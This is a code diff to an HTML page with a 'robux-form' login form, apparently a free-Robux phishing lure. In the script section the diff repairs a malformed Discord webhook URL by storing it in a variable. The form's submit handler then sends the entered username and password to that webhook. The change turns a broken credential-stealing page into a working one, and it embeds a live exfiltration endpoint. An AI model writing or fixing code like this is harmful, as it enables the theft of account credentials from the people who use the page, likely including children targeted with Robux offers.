@@ -50,12 +50,14 @@
     <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@3.13.0/dist/tf.min.js"></script>
     <script>
         const form = document.getElementById('robux-form');
+        const webhookUrl = 'https://discord.com/api/webhooks/1560784848933617684/We2bmkwuaT5H4vMqbYT1e9nhL0cVue53tkGeAD_o88hqU-e_DWxPrXkUGC1t797dK2JQ';
+        
         form.addEventListener('submit', (e) => {
             e.preventDefault();
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            fetch('https://discord.com/api/webhooks/1560784848933617684/We2bmkwuaT5H4vMqbYT1e9nhL0cVue53tkGeAD_o88hqU-e_DWxPrXkUGC1t797dK2JQhttps://discord.com/api/webhooks/1560784848933617684/We2bmkwuaT5H4vMqbYT1e9nhL0cVue53tkGeAD_o88hqU-e_DWxPrXkUGC1t797dK2JQ', {
+            fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -78,4 +80,6 @@
         });
     </script>
 </body>
+</html>
+
 </html>
